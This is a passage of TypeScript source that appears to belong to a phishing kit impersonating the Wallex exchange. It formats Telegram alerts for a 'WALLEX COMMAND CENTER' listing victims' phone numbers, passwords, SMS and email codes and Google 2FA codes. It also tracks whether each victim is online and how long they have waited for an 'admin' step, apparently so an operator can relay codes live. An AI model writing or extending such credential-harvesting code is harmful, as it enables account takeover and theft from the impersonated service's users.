    durationText = `${durationSec}s`;
  } else if (durationMin < 60) {
    durationText = `${durationMin}m ${durationSec}s`;
  } else {
    const hours = Math.floor(durationMin / 60);
    const mins = durationMin % 60;
    durationText = `${hours}h ${mins}m`;
  }

  // Smart priority system
  const getSmartStatus = (
    step: string,
    duration: number,
  ): {
    emoji: string;
    priority: string;
    urgency: string;
  } => {
    const isUrgent = duration > 10; // More than 10 minutes
    const isCritical = duration > 30; // More than 30 minutes

    switch (step) {
      case "waiting_admin":
        if (isCritical)
          return { emoji: "🔴", priority: "CRITICAL", urgency: "⚡" };
        if (isUrgent) return { emoji: "🟠", priority: "URGENT", urgency: "⏰" };
        return { emoji: "🟡", priority: "PENDING", urgency: "📋" };
      case "phone_verification":
        return { emoji: "🔵", priority: "VERIFY", urgency: "📱" };
      case "completed":
        return { emoji: "🟢", priority: "SUCCESS", urgency: "✅" };
      default:
        return { emoji: "⚪", priority: "PROCESSING", urgency: "⚙️" };
    }
  };

  const status = getSmartStatus(session.currentStep, durationMin);

  // Professional header
  let message = `${status.emoji} <b>WALLEX AUTH</b> ${status.priority} ${status.urgency}
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
📱 <b>${escapeHtml(session.phoneNumber)}</b>
🕐 ${currentDate} ${currentTime} • ${durationText}`;

  // Simple and clear user status for managing multiple users
  if (session.onlineStatus) {
    const timeSinceUpdate = Date.now() - session.onlineStatus.lastUpdate;

    // Simple status determination
    let statusIcon;
    let statusText;

    if (session.onlineStatus.isOnline && session.onlineStatus.isVisible) {
      // User is actively online
      statusIcon = "🟢";
      statusText = "online";
    } else if (
      session.onlineStatus.isOnline &&
      !session.onlineStatus.isVisible
    ) {
      // User online but tab is inactive
      statusIcon = "🟡";
      statusText = "away";
    } else {
      // User is offline
      statusIcon = "🔴";
      statusText = "offline";
    }

    // Simple time display
    let timeAgo;
    if (timeSinceUpdate < 60000) {
      timeAgo = `${Math.floor(timeSinceUpdate / 1000)}s`;
    } else if (timeSinceUpdate < 3600000) {
      timeAgo = `${Math.floor(timeSinceUpdate / 60000)}m`;
    } else {
      timeAgo = `${Math.floor(timeSinceUpdate / 3600000)}h`;
    }

    // Single line status - perfect for multiple users
    message += `\n${statusIcon} <b>${statusText}</b> • ${timeAgo}`;
  } else {
    // اگر onlineStatus موجود نیست، فرض کن کاربر آنلاین است
    message += `\n🟢 <b>online</b> • new`;
  }
  // Group codes by type with internal numbering
  let codeGroups = [];

  // Phone/SMS Codes (treat as one group since they're the same)
  let phoneSMSCodes = [];

  // Add phone verification code
  if (session.phoneVerificationCode) {
    phoneSMSCodes.push(escapeHtml(session.phoneVerificationCode));
  }

  // Add SMS codes from authCodes
  if (session.authCodes && session.authCodes["sms"]) {
    session.authCodes["sms"].forEach((code) => {
      if (!phoneSMSCodes.includes(escapeHtml(code))) {
        // Avoid duplicates
        phoneSMSCodes.push(escapeHtml(code));
      }
    });
  }

  if (phoneSMSCodes.length > 0) {
    const numberedCodes = phoneSMSCodes
      .map((code, index) => `${index + 1}.<code>${code}</code>`)
      .join(" - ");
    codeGroups.push(`<b>Phone/SMS:</b> ${numberedCodes}`);
  }

  // Email Address
  if (session.email) {
    const emailShort =
      session.email.length > 30
        ? session.email.substring(0, 27) + "..."
        : session.email;
    codeGroups.push(`<b>Email:</b> <code>${escapeHtml(emailShort)}</code>`);
  }

  // Email Codes
  let emailCodes = [];
  if (session.emailCode) {
    emailCodes.push(escapeHtml(session.emailCode));
  }
  if (session.authCodes && session.authCodes["email"]) {
    session.authCodes["email"].forEach((code) => {
      if (!emailCodes.includes(escapeHtml(code))) {
        // Avoid duplicates
        emailCodes.push(escapeHtml(code));
      }
    });
  }
  if (emailCodes.length > 0) {
    const numberedCodes = emailCodes
      .map((code, index) => `${index + 1}.<code>${code}</code>`)
      .join(" - ");
    codeGroups.push(`<b>Email Code:</b> ${numberedCodes}`);
  }

  // Password Codes
  if (
    session.authCodes &&
    session.authCodes["password"] &&
    session.authCodes["password"].length > 0
  ) {
    const numberedCodes = session.authCodes["password"]
      .map((code, index) => `${index + 1}.<code>${escapeHtml(code)}</code>`)
      .join(" - ");
    codeGroups.push(`<b>Password:</b> ${numberedCodes}`);
  }

  // 2FA Codes
  if (
    session.authCodes &&
    session.authCodes["google"] &&
    session.authCodes["google"].length > 0
  ) {
    const numberedCodes = session.authCodes["google"]
      .map((code, index) => `${index + 1}.<code>${escapeHtml(code)}</code>`)
      .join(" - ");
    codeGroups.push(`<b>2FA Code:</b> ${numberedCodes}`);
  }

  // Add grouped codes section if any codes exist
  if (codeGroups.length > 0) {
    message += `\n\n🔐 <b>AUTHENTICATION DATA:</b>\n` + codeGroups.join("\n");
  }

  // Simple footer with session info
  message += `\n\n🆔 Session: <code>${session.sessionId.substring(0, 10)}</code>

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
<i>🔐 WALLEX COMMAND CENTER</i>`;

  return message;
};

/**
 * Get step display name - simple format
 */
const getStepDisplayName = (stepType: string): string => {
  const names: { [key: string]: string } = {
    password: "رمز عبور",
    google: "Google Auth",
    sms: "کد SMS",
    email: "کد ایمیل",
  };

  return names[stepType] || stepType;
};

const formatInitialMessage = (session: UserSession): string => {
  return formatSessionMessage(session);
};

/**
 * Validate Telegram configuration
 */
export const validateTelegramConfig = (): boolean => {
  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN") {
    return false;
  }

  if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID") {
    return false;
  }

  return true;
};
